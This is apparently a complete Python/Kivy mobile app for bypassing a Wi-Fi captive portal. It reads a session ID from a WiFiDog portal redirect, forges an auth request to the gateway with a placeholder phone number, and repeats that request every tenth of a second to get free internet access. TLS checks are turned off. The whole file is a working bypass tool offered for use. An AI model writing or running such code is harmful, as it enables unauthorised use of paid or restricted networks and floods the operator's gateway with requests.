import requests
import urllib3
import time
import threading
from urllib.parse import urlparse, parse_qs
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PremiumPassApp(App):
    def build(self):
        self.stop_event = threading.Event()
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)

        self.status_label = Label(text="[Status: Idle]", font_size='22sp', size_hint_y=0.1)
        layout.add_widget(self.status_label)

        self.scroll_view = ScrollView(size_hint=(1, 0.7))
        self.log_label = Label(text="Premium Pass Ready...", size_hint_y=None, halign='left', valign='top', text_size=(400, None))
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        self.scroll_view.add_widget(self.log_label)
        layout.add_widget(self.scroll_view)

        btn_layout = BoxLayout(orientation='horizontal', spacing=10, size_hint_y=0.2)
        
        self.start_btn = Button(text="START BYPASS", background_color=(0, 0.8, 0, 1))
        self.start_btn.bind(on_press=self.start_engine)
        
        self.stop_btn = Button(text="STOP", background_color=(0.8, 0, 0, 1), disabled=True)
        self.stop_btn.bind(on_press=self.stop_engine)
        
        btn_layout.add_widget(self.start_btn)
        btn_layout.add_widget(self.stop_btn)
        layout.add_widget(btn_layout)

        return layout

    def update_log(self, msg):
        Clock.schedule_once(lambda dt: self._append_text(msg))

    def _append_text(self, msg):
        self.log_label.text += f"\n{msg}"
        self.scroll_view.scroll_y = 0

    def start_engine(self, instance):
        self.stop_event.clear()
        self.start_btn.disabled = True
        self.stop_btn.disabled = False
        self.status_label.text = "[Status: Running...]"
        self.update_log("[*] Initializing Turbo Engine...")
        threading.Thread(target=self.bypass_logic, daemon=True).start()

    def stop_engine(self, instance):
        self.stop_event.set()
        self.start_btn.disabled = False
        self.stop_btn.disabled = True
        self.status_label.text = "[Status: Stopped]"
        self.update_log("[!] Engine Shutdown.")

    def check_internet(self):
        try:
            return requests.get("http://www.google.com", timeout=3).status_code == 200
        except:
            return False

    def bypass_logic(self):
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        session = requests.Session()
        
        while not self.stop_event.is_set():
            try:
                r = requests.get(test_url, allow_redirects=True, timeout=5)
                if r.url == test_url:
                    if self.check_internet():
                        self.update_log("[✓] Internet Active!")
                        time.sleep(10)
                        continue

                portal_url = r.url
                r1 = session.get(portal_url, verify=False)
                sid_list = parse_qs(urlparse(r1.url).query).get('sessionId', [None])
                sid = sid_list[0] if sid_list else None
                
                if sid:
                    self.update_log(f"[✓] SID: {sid}")
                    params = parse_qs(urlparse(portal_url).query)
                    gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                    gw_port = params.get('gw_port', ['2060'])[0]
                    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
                    
                    self.update_log("[*] Pulsing Turbo threads...")
                    while not self.stop_event.is_set():
                        session.get(auth_link, timeout=5)
                        time.sleep(0.1)
                else:
                    self.update_log("[-] No SID found, retrying...")
                    time.sleep(3)
                
            except Exception as e:
                self.update_log(f"[X] Retrying... Error: {e}")
                time.sleep(5)

if __name__ == "__main__":
    PremiumPassApp().run()
